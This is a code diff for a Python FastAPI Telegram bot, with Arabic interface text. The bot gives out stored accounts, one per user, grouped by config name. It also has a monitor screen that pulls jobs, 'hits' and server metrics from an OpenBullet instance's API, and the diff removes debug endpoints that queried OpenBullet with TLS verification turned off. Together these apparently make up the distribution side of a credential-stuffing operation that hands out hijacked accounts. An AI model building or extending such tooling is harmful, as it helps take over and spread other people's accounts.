@@ -597,89 +571,92 @@ async def telegram_webhook(request: Request):
 
         if text == "/start":
             await tg_send(chat_id,
-                "🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
-                "⚡ `الحالة: متصل بالشبكة الآمنة`\n"
-                "🎛️ `الواجهة: ثيم التوزيع التفاعلي v4.8`\n\n"
-                "🤖 _اضغط على سحب حساب بالأسفل..._",
+                "🌌 ═══ **CYBERPUNK DISTRIBUTOR** ═══\n\n"
+                "⚡ `Status: Connected`\n"
+                "🎛️ `Interface: v5.0`\n\n"
+                "_اختر من القائمة أدناه_",
                 reply_markup=get_main_keyboard(is_admin),
             )
 
-        elif text in ("📡 🌐 إحصائيات المخزن 🌐 📡", "/stats"):
+        elif text in ("📡 إحصائيات المخزون", "/stats"):
             avail = db.query(Account).filter(Account.is_given == False).count()
+            total = db.query(Account).count()
+            given = total - avail
             await tg_send(chat_id,
-                "┌─── 📡 **「 مستودع البيانات 」** 📡\n"
-                "│\n"
-                f"└── 🟢 **المتوفر:** `{avail}` حساب\n"
-                "│\n"
-                "└───────────── [ مصفوفة حية ] ⚡",
+                "📡 ═══ **STORAGE** ═══\n\n"
+                f"├ 🟢 **متوفر:** `{avail}`\n"
+                f"├ 🔴 **موزع:** `{given}`\n"
+                f"└ 🟣 **إجمالي:** `{total}`\n\n"
+                "══════════════════════════════",
             )
 
-        elif text in ("⚡ 🧬 سحب حساب جديد 🧬 ⚡", "/get"):
+        elif text in ("⚡ ⚡ سحب حساب جديد", "/get"):
             if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
-                await tg_send(chat_id,
-                    "🚨 **SYSTEM DENIAL:** `جدار الحماية نشط` 🚨\n\n"
-                    "❌ يسمح النظام بـ **حساب واحد فقط لكل مستخدم**.",
-                )
+                await tg_send(chat_id, "🚨 **ACCESS DENIED**\n\n❌ _حساب واحد فقط لكل مستخدم_")
                 return {"status": "ok"}
 
-            results = (
-                db.query(Account.config_name, func.count(Account.id))
-                .filter(Account.is_given == False)
-                .group_by(Account.config_name).all()
-            )
+            results = db.query(Account.config_name, func.count(Account.id)).filter(Account.is_given == False).group_by(Account.config_name).all()
             results = [(c, n) for c, n in results if c]
 
             if not results:
-                await tg_send(chat_id,
-                    "🚨 **MAINFRAME ERROR:** `المستودع فارغ حالياً` 🚨\n\n"
-                    "😔 لا توجد حسابات جاهزة.",
-                )
+                await tg_send(chat_id, "🚨 **EMPTY VAULT**\n\n😔 _لا توجد حسابات_")
             else:
-                buttons = []
-                for cfg_name, count in results:
-                    display = cfg_name if len(cfg_name) <= 40 else cfg_name[:37] + "..."
-                    buttons.append([{
-                        "text": f"🎁 {display} ({count})",
-                        "callback_data": f"claim_cfg:{config_hash(cfg_name)}"
-                    }])
+                btns = []
+                for cn, cnt in results:
+                    d = cn if len(cn) <= 38 else cn[:35] + "..."
+                    btns.append([{"text": f"🎁 {d} ({cnt})", "callback_data": f"claim_cfg:{config_hash(cn)}"}])
                 await tg_send(chat_id,
-                    "┌─── 🎛️ **「 قائمة التخصيص 」** 🎛️\n"
-                    "│\n"
-                    "├── ⚡ تم فحص قاعدة البيانات.\n"
-                    "└── 👇 **اختر نوع الحساب:**",
-                    reply_markup={"inline_keyboard": buttons},
+                    "🎛️ ═══ **SELECT TYPE** ═══\n\n_اختر نوع الحساب:_",
+                    reply_markup={"inline_keyboard": btns},
                 )
 
-        elif text == "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖":
-            ob_data = await fetch_ob_status()
-            await tg_send(chat_id, format_ob_message(ob_data))
+        elif text == "🤖 شاشة مراقبة أوبن بلوت":
+            await tg_send(chat_id, "⏳ _جاري الاتصال بأوبن بلوت..._")
+            headers, auth_label = await _auth()
+            if not headers:
+                await tg_send(chat_id, "❌ **فشلت المصادقة مع أوبن بلوت**")
+            else:
+                jobs = await fetch_jobs(headers)
+                hits = await fetch_hits(headers)
+                metrics = await fetch_metrics(headers)
+                msg = format_monitor(jobs, hits, metrics, auth_label)
+                await tg_send(chat_id, msg, reply_markup=get_job_inline(jobs))
 
-        elif text == "🛠️ 👾 لوحة تحكم المطور 👾 🛠️" and is_admin:
+        elif text == "🖥️ معلومات الخادم":
+            await tg_send(chat_id, "⏳ _جاري الاتصال..._")
+            headers, auth_label = await _auth()
+            if not headers:
+                await tg_send(chat_id, "❌ **فشلت المصادقة**")
+            else:
+                metrics = await fetch_metrics(headers)
+                jobs = await fetch_jobs(headers)
+                msg = format_server(metrics, auth_label, len(jobs))
+                await tg_send(chat_id, msg)
+
+        elif text == "🛠️ لوحة تحكم المطور" and is_admin:
             total = db.query(Account).count()
             avail = db.query(Account).filter(Account.is_given == False).count()
             given = db.query(Account).filter(Account.is_given == True).count()
             await tg_send(chat_id,
-                "┌─── 🌌 **「 لوحة تحكم النيون 」** 🌌\n"
-                "│\n"
-                f"├── 🟣 **الإجمالي:** `{total}`\n"
-                f"├── 🟢 **الجاهزة:** `{avail}`\n"
-                f"└── 🔴 **الموزعة:** `{given}`\n"
-                "│\n"
-                "└────────────── [ أوامر النظام ] 👇",
-                reply_markup=get_inline_control_buttons(),
+                "🛠️ ═══ **DEVELOPER PANEL** ═══\n\n"
+                f"├ 🟣 **الإجمالي:** `{total}`\n"
+                f"├ 🟢 **الجاهزة:** `{avail}`\n"
+                f"└ 🔴 **الموزعة:** `{given}`\n\n"
+                "══════════════════════════════",
+                reply_markup=get_admin_inline(),
             )
 
         return {"status": "ok"}
 
     except Exception as e:
         db.rollback()
-        logger.error(f"Telegram webhook error: {e}", exc_info=True)
-        return {"status": "error", "message": str(e)}
+        logger.error(f"Webhook error: {e}", exc_info=True)
+        return {"status": "error"}
     finally:
         db.close()
 
 
-# ==================== DEBUG ENDPOINTS ====================
+# ==================== UTILITIES ====================
 
 
 @app.get("/health")
@@ -687,124 +664,12 @@ def health_check():
     return {"status": "healthy"}
 
 
-@app.get("/debug/ob")
-async def debug_ob():
-    """
-    تشخيص شامل يعرض:
-      - القائمة الخفيفة من /job/all
-      - تفاصيل أول عملية نشطة من /job/{id}
-    """
-    try:
-        headers, auth_label = await get_auth_headers()
-
-        if not headers:
-            return {
-                "error": "فشلت المصادقة",
-                "url": OPENBULLET_URL,
-                "key_preview": (OPENBULLET_API_KEY or "")[:10] + "..." if OPENBULLET_API_KEY else "MISSING",
-            }
-
-        base = OPENBULLET_URL.strip().rstrip("/")
-        result = {
-            "auth": auth_label,
-            "jobs_list": [],
-            "first_active_detail": None,
-            "first_active_detail_unwrapped": None,
-        }
-
-        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
-            # القائمة
-            try:
-                resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    items = data.get("items", data) if isinstance(data, dict) else data
-                    result["jobs_list"] = items if isinstance(items, list) else []
-
-                    # تفاصيل أول عملية نشطة
-                    for j in result["jobs_list"]:
-                        if isinstance(j, dict) and _is_active(j.get("status")) and j.get("id") is not None:
-                            resp2 = await client.get(f"{base}/api/v1/job/{j['id']}", headers=headers)
-                            if resp2.status_code == 200:
-                                raw = resp2.json()
-                                result["first_active_detail"] = raw
-                                result["first_active_detail_unwrapped"] = _unwrap(raw)
-                            else:
-                                result["first_active_detail"] = {
-                                    "http_error": resp2.status_code,
-                                    "body": resp2.text[:500]
-                                }
-                            break
-                else:
-                    result["list_error"] = f"HTTP {resp.status_code}: {resp.text[:300]}"
-            except Exception as e:
-                result["list_error"] = str(e)
-
-        return result
-
-    except Exception as e:
-        logger.error(f"/debug/ob error: {e}", exc_info=True)
-        return {"fatal_error": str(e)}
-
-
-@app.get("/debug/job/{job_id}")
-async def debug_job(job_id: int):
-    """
-    يعرض تفاصيل عملية واحدة بالكامل كما جاءت من API.
-    آمن تماماً ضد أي خطأ.
-    """
-    try:
-        if not OPENBULLET_URL or not OPENBULLET_API_KEY:
-            return {"error": "متغيرات البيئة غير مكتملة", "url": OPENBULLET_URL, "has_key": bool(OPENBULLET_API_KEY)}
-
-        base = OPENBULLET_URL.strip().rstrip("/")
-        headers, auth_label = await get_auth_headers()
-
-        if not headers:
-            return {"error": "فشلت المصادقة", "auth_tried": auth_label}
-
-        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
-            resp = await client.get(f"{base}/api/v1/job/{job_id}", headers=headers)
-
-            result = {
-                "job_id": job_id,
-                "auth_used": auth_label,
-                "http_status": resp.status_code,
-                "content_type": resp.headers.get("content-type", "?"),
-            }
-
-            if resp.status_code == 200:
-                try:
-                    raw = resp.json()
-                    result["raw_json"] = raw
-                    result["unwrapped"] = _unwrap(raw)
-                    result["extracted"] = _extract_detail(raw)
-                except Exception as e:
-                    result["parse_error"] = str(e)
-                    result["raw_text"] = resp.text[:2000]
-            else:
-                result["error_body"] = resp.text[:1000]
-
-            return result
-
-    except httpx.ConnectError:
-        return {"error": "فشل الاتصال بالخادم", "url": OPENBULLET_URL}
-    except httpx.TimeoutException:
-        return {"error": "انتهت مهلة الاتصال (15 ثانية)"}
-    except Exception as e:
-        logger.error(f"/debug/job/{job_id} error: {e}", exc_info=True)
-        return {"error": f"خطأ غير متوقع: {e}"}
-
-
 @app.post("/setup/webhook")
 async def setup_webhook():
-    render_url = os.getenv("RENDER_EXTERNAL_URL", "")
-    if not render_url:
+    url = os.getenv("RENDER_EXTERNAL_URL", "")
+    if not url:
         return {"error": "RENDER_EXTERNAL_URL not set"}
-    webhook_url = f"{render_url.rstrip('/')}/webhook/telegram"
+    wh = f"{url.rstrip('/')}/webhook/telegram"
     async with httpx.AsyncClient() as c:
-        resp = await c.post(
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook",
-            json={"url": webhook_url},
-        )
-    return resp.json()
+        r = await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook", json={"url": wh})
+    return r.json()
